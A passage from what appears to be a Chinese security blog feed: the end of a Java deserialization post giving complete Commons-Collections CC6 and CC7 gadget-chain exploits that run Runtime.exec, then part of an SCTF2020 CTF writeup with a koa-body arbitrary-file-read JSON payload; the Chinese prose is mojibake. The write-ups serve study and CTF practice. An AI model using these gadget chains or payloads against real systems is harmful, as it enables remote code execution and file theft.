·å°±å¯ä»¥ç›´æ¥putè§¦å‘äº†ã€‚ç„¶åå®˜æ–¹çš„é“¾å­ä¸çŸ¥é“ä¸ºå•¥åŠ ä¸Šäº†ä¸€ä¸ªHashset,æœ‰ç‚¹å¥‡æ€ªã€‚</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc6</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        HashMap innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">"byc"</span>);</span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line">        innerMap.clear();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(hashMap);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·ä¹Ÿæ˜¯ccä¾èµ–3,4é€šç”¨ã€‚</p><p>ç„¶åå¼ºç½‘æ¯å½“æ—¶ä¸€é“javaé¢˜è®°å¾—å°±æ˜¯ç”¨çš„cc6çš„é“¾å­æ”¹äº†ä¸‹ã€‚å› ä¸ºå½“æ—¶æ˜¯å­˜åœ¨æ‰‹å†™çš„é»‘åå•ï¼Œä¸èƒ½ç”¨hashmap,ä½†æ˜¯å¯ä»¥æ‰¾æ›¿ä»£çš„hashcodeæ¥åˆ©ç”¨ã€‚æ‰€ä»¥ç”¨HashBagæ›¿æ¢ä¸€ä¸‹å°±è¡Œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashBag hashMap = <span class="keyword">new</span> HashBag();</span><br><span class="line">hashMap.add(tiedMapEntry, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>hashBagç»§æ‰¿äº†ä¸€ä¸ªæŠ½è±¡ç±»,ç„¶åæ–¹æ³•åŸºæœ¬è·ŸHashMapå·®ä¸å¤šã€‚æ‰€ä»¥å°æ”¹ä¸‹å°±å¯ä»¥ç›´æ¥æ‰“äº†ã€‚</p><ul><li>CommonsCollections7</li></ul><p>cc7çš„é“¾å­æ˜¯é€šè¿‡AbstractMap#equalsæ¥è§¦å‘LazyMap#get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!(o <span class="keyword">instanceof</span> Map))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o;</span><br><span class="line">    <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="keyword">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚æœæ§åˆ¶mä¸ºlazymapå³å¯è§¦å‘rce.</p><p>ç„¶åcc7æ˜¯åœ¨HashTable#reconstitutionPutä¸­è°ƒç”¨è¿‡equalsæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> hash = hash(key);</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br></pre></td></tr></table></figure><p>ç„¶åHashTableçš„readObjectä¹Ÿè°ƒç”¨è¿‡äº†reconstitutionPut.æ‰€ä»¥å¯ä»¥è§¦å‘ã€‚</p><p>exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.bycsec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">cc7</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(java.lang.Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;"getRuntime", new Class[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[]&#123;String[].class&#125;, new Object[]&#123;new String[]&#123;"calc"&#125;&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap innerMap1 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap1.put(<span class="string">"yy"</span>, <span class="string">"1"</span>); <span class="comment">// "yy".hashCode() == "zZ".hashCode() == 3872</span></span><br><span class="line">        HashMap innerMap2 = <span class="keyword">new</span> HashMap&lt;String, String&gt;();</span><br><span class="line">        innerMap2.put(<span class="string">"zZ"</span>, <span class="string">"1"</span>);</span><br><span class="line"></span><br><span class="line">        LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);</span><br><span class="line">        LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        hashMap.put(lazyMap1, <span class="string">"placeholder"</span>);</span><br><span class="line">        hashMap.put(lazyMap2, <span class="string">"placeholder"</span>);</span><br><span class="line"></span><br><span class="line">        innerMap1.remove(<span class="string">"zZ"</span>); </span><br><span class="line"></span><br><span class="line">        Field field = chainedTransformer.getClass().getDeclaredField(<span class="string">"iTransformers"</span>); </span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            oos.writeObject(hashMap);</span><br><span class="line">            oos.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ªç»†èŠ‚ã€‚å°±æ˜¯é¦–å…ˆéœ€è¦putä¸¤æ¬¡æ‰èƒ½è°ƒç”¨equalsæ–¹æ³•ã€‚<br>ç„¶åç”±äºä¸€ä¸ªå°bug</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"yy"</span>.hashCode() == <span class="string">"zZ"</span>.hashCode()</span><br></pre></td></tr></table></figure><p>ä¼šå¯¼è‡´â€ç¢°æ’â€å‘ç”Ÿï¼Œå…¶å®å°±æ˜¯å› ä¸ºè¿™æ ·è®¡ç®—å‡ºæ¥çš„hashä¸€è‡´æ‰€ä»¥ä¼šå¯¼è‡´å®ƒè°ƒç”¨å…¶ä¸­ä¸€ä¸ªå¯¹è±¡çš„equalsæ–¹æ³•è¿›è¡Œæ¯”è¾ƒã€‚è¿™æ ·å°±èƒ½æˆåŠŸè¿›å…¥æˆ‘ä»¬çš„gadgetäº†ã€‚æœ€åexpremoveæ‰zZè¿™ç¬¬äºŒä¸ªå…ƒç´ ã€‚è¿™æ˜¯è¦å»æ‰è¿™ä¸ªé”®ã€‚å¦åˆ™è¿™ä¸ªhashmapä¼šå¸¦ä¸Šæ— æ³•åºåˆ—åŒ–çš„å¯¹è±¡ä»è€Œä½¿ååºåˆ—åŒ–å¤±è´¥ã€‚</p><ul><li>summary</li></ul><p>æ²¡æƒ³åˆ°æœ€åè¿˜æ˜¯æˆåŠŸæŠŠé“¾å­éƒ½è·Ÿå®Œäº†ã€‚è¿™ç¯‡æ–‡ç« å°±å†™è¿™ä¹ˆå¤šäº†ã€‚ååºåˆ—åŒ–çš„gadgetè·Ÿè¿›è¯´å®è¯æ¯”èµ·phpå°‘äº†ä¸€ç‚¹å˜é€šï¼Œä½†æ˜¯éš¾åº¦è¿˜æ˜¯æœ‰ç‚¹å¤§çš„ã€‚ä¸è¿‡æ•´ä½“ä¸‹æ¥ä¸éš¾å‘ç°Mapç±»,ccåº“ä¸­çš„ä¸€ç³»åˆ—Transformerç±»ï¼Œåå°„çš„æŠ€å·§èµ·åˆ°äº†è‡³å…³é‡è¦çš„ä½œç”¨ã€‚å¹¶ä¸”å®é™…ä¸Šè‚¯å®šå­˜åœ¨æ›´å¤šgadgetç­‰å¾…å‘æ˜ã€‚</p><p>åé¢ä¼šæŠ½ç©ºå»å­¦ä¹ ä¸‹shiro,jackson,fastjsonç­‰ç­‰çš„æ·±åº¦åˆ†æã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SCTF2020 writeup</title>
      <link href="2020/07/05/SCTF2020-writeup/"/>
      <url>2020/07/05/SCTF2020-writeup/</url>
      
        <content type="html"><![CDATA[<p>è¶Šæ‰“è¶Šèœ :(<br>è¿™æ¬¡æ¯”èµ›éš¾åº¦ç›¸æ¯”ä¸Šæ¬¡RCTFçš„éš¾åº¦å¥½äº†ç‚¹ã€‚ä½†æ˜¯æœ€åè¿˜æ˜¯åªèƒ½æ„Ÿæ…¨è‡ªå·±tclã€‚åšå‡ºæ¥çš„åªæœ‰CloudDiskè·ŸUnsafeDefenseSystem.ç›¸æ¯”ä¸‹solveæ¯”è¾ƒå¤šçš„pythonsandboxè‡ªå·±åè€Œå› ä¸ºæ€»è§‰å¾—pyjailå¤ªè€å¥—ä¸å»ç ”ç©¶,è¿ä¸‹æ‰‹éƒ½åšä¸åˆ°â€¦â€¦èµ›åè¿˜æ˜¯æŠŠèƒ½å¤ç°çš„éƒ½å¤ç°ä¸‹å§ã€‚</p><a id="more"></a><h1 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h1><p>Nodejsç»å…¸æ¼æ´ã€‚å…¶å®å› ä¸ºæœ€è¿‘ç»ƒæ‰‹å‡ºäº†äº›Nodejsçš„é¢˜ç›®,ç°åœ¨æ„Ÿè§‰Nodeå†™èµ·æ¥å·¨èˆ’æœ,ä¼°è®¡æš‘å‡ä¼šé•¿æœŸç»ƒæ‰‹ä¸€äº›nodeé¡¹ç›®ã€‚</p><p>é¦–å…ˆå…ˆä¸è¯´é¢˜ç›®æœ¬èº«,å•ä»æœ€è¿‘å†™nodejsåº”ç”¨expresså…¥æ‰‹ï¼Œå‘ç°expressæ¡†æ¶ä¸€ä¸ªå¯ç”¨æ”¯æŒæ•°æ®çš„å†™æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯è¡¨ç¤ºæˆ‘ä»¬çš„åº”ç”¨æ”¯æŒ<code>application/json</code>è·Ÿ<code>application/x-www-form-urlencoded</code>ä¼ è¾“çš„æ•°æ®.ç›¸ä¿¡åœ¨poståŒ…æ—¶è§è¿‡ä¸å°‘æ¬¡äº†ã€‚è€Œè®©æˆ‘æ³¨æ„åˆ°è¿™ä¸ªé—®é¢˜çš„èµ·å› æ˜¯åœ¨ä¸€æ¬¡CTFæ¯”èµ›ä¸­ã€‚æœ¬æ¥é‚£é¢˜æ˜¯Nodejsååºåˆ—åŒ–ä½œä¸ºè€ƒç‚¹ï¼Œä½†æ˜¯æˆ‘å¼€å§‹åœ¨éšæ„æµ‹è¯•æ—¶å‘ç°äº†å¦ä¸€ä¸ªæ¼æ´ï¼Œä¸è¿‡å› ä¸ºä¸æ˜¯æ­£ç¡®æ€è·¯å°±æ²¡æ·±å…¥ã€‚åæ¥getshellæ—¶æŠŠæºç æ‹¿ä¸‹æ¥ä»”ç»†é˜…è¯»ï¼Œå‘ç°é—®é¢˜å°±æ˜¯å‡ºåœ¨è¿™ä¸Šé¢ã€‚å¯¹äºNodejsè€Œè¨€,ä¼ è¾“jsonæ•°æ®æ˜¯éå¸¸å±é™©çš„ä¸€ä»¶äº‹ã€‚å› ä¸ºNodejsæœ¬èº«å°±æ˜¯jsçš„ä¸€ä¸ªruntimeç¯å¢ƒ,javascriptçš„å¯¹è±¡å†™æ³•å°±æ˜¯<code>{&quot;sth&quot;:&quot;byc&quot;}</code>ä¹‹ç±»çš„ã€‚è€Œjsonæ•°æ®ä¸è¿™çš„æ ¼å¼ä¸€è‡´æ€§å¾€å¾€å¯¼è‡´ä¼ è¾“çš„æ•°æ®ä¼šè¢«è¿›è¡Œæ··æ·†ã€‚ä¸€æ—¦ç¨‹åºå†™æ³•æœ‰äº†é—®é¢˜ï¼Œå°±å¯èƒ½è¯¯å–æŸä¸ªç”¨æˆ·ä¼ è¾“çš„å€¼ä½œä¸ºå¯¹è±¡çš„å±æ€§ï¼Œå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼Œå˜é‡æ··æ·†ï¼ŒNosqlæ³¨å…¥ä¹‹ç±»çš„ã€‚</p><p>å›åˆ°é¢˜ç›®ã€‚ç”±äºæœ‰æºç ,æ‰€ä»¥ç›´æ¥ä¸Šæ‰‹åˆ†æã€‚å½“ç„¶ç”±äºNodejsçš„ç‰¹æ€§ï¼Œä»¥åŠæœ¬é¢˜æ‰€æ‰§è¡Œçš„ä¸Šä¼ ä¸‹è½½çš„è¿‡ç¨‹,åœ¨ä¾èµ–æ­£å¸¸çš„æƒ…å†µä¸‹ä¸å¯èƒ½å‡ºç°æ³¨å…¥ï¼Œè·¯å¾„ç©¿è¶Šä¹‹ç±»çš„é—®é¢˜ã€‚åªå¯èƒ½æ˜¯æ–‡ä»¶è¯»å–äº†ã€‚é‚£ä¹ˆé—®é¢˜å‡ºåœ¨å“ªå‘¢</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> file = ctx.request.body.files.file;</span><br><span class="line"><span class="keyword">const</span> reader = fs.createReadStream(file.path);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> upStream = fs.createWriteStream(filePath);</span><br></pre></td></tr></table></figure><p>æ³¨æ„è¿™é‡Œ,å®ƒçš„å–å€¼æ˜¯ä»ctx.request.bodyä¸­å–çš„ã€‚è€Œè¿™å°±æœ‰å¯èƒ½å‡ºç°ä¸Šé¢æåˆ°çš„é—®é¢˜ã€‚å‡å¦‚æˆ‘ä»¬ä¼ è¾“jsonæ•°æ®fileså¹¶ç½®å…¶pathå±æ€§ä¸ºä»»æ„æ–‡ä»¶ã€‚æˆ‘ä»¬ä¹‹åä¸‹è½½çš„æ–‡ä»¶å°±æ˜¯æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶äº†ã€‚</p><p>æ•…è¯»å–ä¹‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"files"</span>:&#123;<span class="attr">"file"</span>:&#123;<span class="attr">"path"</span>:<span class="string">"/app/flag"</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/07/05/SCTF2020-writeup/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>åæ¥æ ¹æ®é˜Ÿå‹æ•™çš„åº”è¯¥æ˜¯ä¸ªkoa-bodyçš„é—®é¢˜ã€‚éš¾æ€ªæˆ‘æœ¬åœ°å½“æ—¶è¿ä¸Šä¼ éƒ½è·‘ä¸èµ·æ¥ã€‚å› ä¸ºæ˜¯ä¸ª2.xç‰ˆæœ¬çš„koa.å‡ºé¢˜äººä¸ç»™package.jsonä¼°è®¡æ˜¯æ€•ä¸€çœ¼çœ‹å‡ºç‰ˆæœ¬é—®é¢˜å§ã€‚</p><h1 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h1><p>è¯´çœŸçš„ã€‚è¿™é¢˜è¿™æ¬¡çœŸçš„æ˜¯å¿ƒæ€èµ·ä¼æœ€å¤§çš„ä¸€é¢˜ã€‚è¯´å®è¯æˆ‘ä»¬æœ¬æ¥æœ‰æ‹¿ä¸‹ä¸€è¡€çš„æœºä¼šçš„ã€‚ç»“æœå› ä¸ºå°ç»†èŠ‚å°±å¯¼è‡´è‡ªå·±æµªè´¹äº†æ•°ä¸ªå°æ—¶ã€‚ç¬¬ä¸€å¤©æ™šä¸Š9ç‚¹å·¦å³æˆ‘ä»¬å°±å·²ç»åœ¨æ‰“tp5.0.24çš„ååºåˆ—åŒ–äº†ã€‚ç»“æœä¸€ç›´å°±ä»¥å¤±è´¥å‘Šç»ˆ,ç¬¬äºŒå¤©æ‰ç»ˆäºæ˜ç™½é—®é¢˜ä¸æ˜¯å‡ºåœ¨expä¸Š.å…·ä½“åé¢å†è¯´å§ã€‚</p><p>è€å®è¯´è¿™é¢˜æ•´ä½“è„‰ç»œä¸‹æ¥è·Ÿæˆ‘å¹³æ—¶æ¸—é€çš„æ€è·¯å¾ˆç›¸ä¼¼ï¼Œæ‰€ä»¥åœ¨å‰é¢è¿›åº¦éå¸¸é¡ºåˆ©ï¼Œæ²¡æœ‰å¡å£³ã€‚</p><p>ç¬¬ä¸€æ­¥æ˜¯è®¿é—®ç½‘å€ã€‚å‘ç°ä½œäº†ä¸ªè·³è½¬ã€‚åŒæ—¶æé†’äº†<strong>log.txt</strong>çš„å­˜åœ¨.(å°±æ˜¯å› ä¸ºæˆ‘çœ‹æ‰äº†log.txtå¯¼è‡´åé¢æµªè´¹çš„å·¨é‡æ—¶é—´ï¼Œè¯¥æ‰“)</p><p>å› ä¸ºè·³è½¬åˆ°<code>/public/test</code>ã€‚æ‰€ä»¥ç›´æ¥è®¿é—®è¿™ä¸ªè·¯ç”±ã€‚å¾—åˆ°ä¸€ä¸ªç½‘é¡µã€‚éšä¾¿ç‚¹ç‚¹åä¼¼ä¹æ˜¯é™æ€çš„ã€‚è¿™æ—¶å€™æœæ–­åˆ‡ctrl+uçœ‹æºç ,å¹¶ä¸”ctrl+fæœç´¢phpã€‚çœ‹æœ‰æ²¡æœ‰åŠ¨æ€æ–‡ä»¶å­˜åœ¨ã€‚<br>æœç„¶åœ¨æ³¨é‡Šä¸­æ‰¾åˆ°äº†ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Admin:/public/nationalsb/login.php --&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®åå‘ç°æ˜¯ä¸ªauthçš„ç™»å½•ã€‚ä½†æ˜¯ä»»æ„ç”¨æˆ·å¯†ç 